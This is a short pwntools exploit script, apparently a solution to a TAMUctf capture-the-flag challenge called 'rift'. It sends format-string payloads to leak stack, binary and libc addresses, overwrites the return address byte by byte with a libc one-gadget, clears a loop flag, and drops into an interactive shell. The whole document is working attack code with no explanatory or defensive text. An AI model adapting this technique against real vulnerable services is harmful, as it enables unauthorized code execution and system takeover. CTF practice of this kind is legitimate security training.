from pwn import *

p = remote("tamuctf.com", 443, ssl=True, sni="rift")
# p = process("./rift")

# leak address
payload = b'%8$p %9$p %11$p'
p.sendline(payload)
leak = list(map(lambda x: int(x, 16), p.recvline()[:-1].split()))
stack     = leak[0] - 0x10
bin_base  = leak[1] - 0x1214
libc_base = leak[2] - 0x2409b
log.info(f"stack     = {hex(stack)}")
log.info(f"bin_base  = {hex(bin_base)}")
log.info(f"libc_base = {hex(libc_base)}")

# overwrite return address to one gadget
one_gadget = libc_base + 0xe5306
for i in range(6):
    payload = f"%{(stack + 0x18 + i) & 0xffff}c%13$hn".encode()
    p.sendline(payload)
    payload = f"%{(one_gadget >> (i * 8)) & 0xff}c%39$hhn".encode()
    p.sendline(payload)

# always_true = 0
payload = f"%{(stack - 0x04) & 0xffff}c%13$hn".encode()
p.sendline(payload)
payload = f"%39$hhn".encode()
p.sendline(payload)

p.interactive()
